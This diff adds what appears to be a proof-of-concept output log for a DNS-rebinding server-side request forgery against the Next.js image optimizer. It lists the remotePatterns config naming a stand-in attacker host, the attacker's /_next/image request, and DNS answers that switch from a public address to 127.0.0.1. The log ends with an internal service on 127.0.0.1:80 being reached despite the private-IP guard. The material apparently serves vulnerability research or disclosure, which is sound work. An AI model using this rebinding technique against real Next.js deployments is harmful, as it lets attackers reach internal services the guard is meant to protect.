@@ -1,0 +1,29 @@
+=== 0. environment ===
+next: 16.3.4
+images.remotePatterns:
+        remotePatterns: [
+          { protocol: 'http', hostname: 'rebind.attacker.test' },
+          { protocol: 'https', hostname: 'images.example.com', pathname: '/**' },
+        ],
+
+=== 1. the guard, in isolation: the name currently resolves public ===
+   getaddrinfo #1 -> 93.184.216.34
+
+=== 2. attacker request to the image optimizer ===
+    GET /_next/image?url=http://rebind.attacker.test/x.png&w=640&q=75
+    http status = 400
+
+=== 3. DNS answers actually served, in order ===
+     -- counter reset (new run) --
+     A query #1 -> 93.184.216.34
+     -- counter reset (new run) --
+     A query #1 -> 93.184.216.34
+     A query #2 -> 127.0.0.1
+    (#1 is the guard's dns.lookup(); #2 is fetch()'s own resolution)
+
+=== 4. did the request reach the internal service on 127.0.0.1:80? ===
+   INTERNAL SERVICE HIT: /x.png host=rebind.attacker.test
+    -> SSRF DELIVERED despite the private-IP guard
+
+=== 5. what Next.js logged ===
+   ⨯ The requested resource isn't a valid image for http://rebind.attacker.test/x.png received null
